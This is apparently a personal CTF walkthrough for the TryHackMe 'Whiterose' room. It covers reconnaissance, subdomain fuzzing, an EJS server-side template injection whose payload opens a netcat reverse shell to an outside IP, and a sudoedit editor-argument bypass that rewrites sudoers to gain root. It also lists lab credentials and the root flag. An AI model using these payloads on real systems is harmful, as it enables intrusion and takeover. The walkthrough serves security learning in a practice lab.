---
title: "TryHackMe - Whiterose Walkthrough"
date: 2024-12-12
categories: [TryHackMe]
tags: [CTF, SSTI, RCE, Privilege Escalation]
image: assets/images/thm-cover/whiterose-Cover.jpg
---

# TryHackMe - Whiterose Walkthrough

---

## Initial Information
- **Username:** Olivia Cortez  
- **Password:** olivi8  

---

## Step 1: Nmap Scan

Run an Nmap scan to identify open ports and services:

```bash
sleep33@THM:~$ nmap -v -sVC -p- -oN nmap.txt $IP
```

### Results:
- **Port 22 (SSH):** OpenSSH 7.6p1 Ubuntu  
- **Port 80 (HTTP):** nginx 1.14.0 (Ubuntu)  

---

## Step 2: Configure Hosts File

Add the following to your `/etc/hosts` file:

```plaintext
sleep33@THM:~$ echo "10.246.13 cyprusbank.thm" | sudo tee -a /etc/hosts
```

---

## Step 3: Subdomain Enumeration

Enumerate subdomains using `ffuf`:

```bash
sleep33@THM:~$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cyprusbank.thm/ -H "Host:FUZZ.cyprusbank.thm" -fw 1
```

### Found Subdomains:
- **www**: [200 OK]  
- **admin**: [302 Redirect]  

Add the following to your `/etc/hosts`:

```plaintext
sleep33@THM:~$ echo "10.246.13 admin.cyprusbank.thm" | sudo tee -a /etc/hosts
```

---

## Step 4: Admin Panel Access

1. Visit `http://admin.cyprusbank.thm/`.
2. Log in with:
   - **Username:** Olivia Cortez  
   - **Password:** olivi8  

---

## Step 5: Messages Exploration

Navigate through messages using the following URL format:

```bash
sleep33@THM:~$ curl http://admin.cyprusbank.thm/messages/?c=<number>
```

### Key Findings:
- **Credentials:**  
  ```plaintext
  GayleBev: p~]P@5!6;rs558:q
  ```
- **Phone Number:**  
  ```plaintext
  Tyrell Wellick: 842-029-5701
  ```

---

## Step 6: Exploiting SSTI (Server-Side Template Injection)

### Exploitation
Send a POST request to `/settings` using the following payload:

```bash
sleep33@THM:~$ curl -X POST -d "name=admin&password=admin&settings[view options][client]=true&settings[view options][escapeFunction]=1;return global.process.mainModule.constructor._load('child_process').execSync('nc -e /bin/bash 10.14.91.33 4443');" http://admin.cyprusbank.thm/settings
```

---

## Step 7: Reverse Shell Setup

Set up a listener on your local machine:

```bash
sleep33@THM:~$ nc -lvnp 4443
```

---

## Step 8: Privilege Escalation

### Check Sudo Permissions

```bash
sleep33@THM:~$ sudo -l
```

### Exploit `sudoedit`

1. Export the editor:
   ```bash
   sleep33@THM:~$ export SUDO_EDITOR='nano -- /etc/sudoers'
   ```
2. Run:
   ```bash
   sleep33@THM:~$ sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
   ```

### Modify Sudoers File:
Add the following:

```plaintext
web ALL=(ALL:ALL) NOPASSWD: ALL
```

---

## Step 9: Gain Root

Switch to the root user:

```bash
sleep33@THM:~$ sudo bash
```

Navigate to `/root` and read the flag:

```bash
sleep33@THM:~$ cd /root
sleep33@THM:~$ cat root.txt
```

**Root Flag:**  
```plaintext
THM{4nd_uR_p4ck4g3s}
```
---
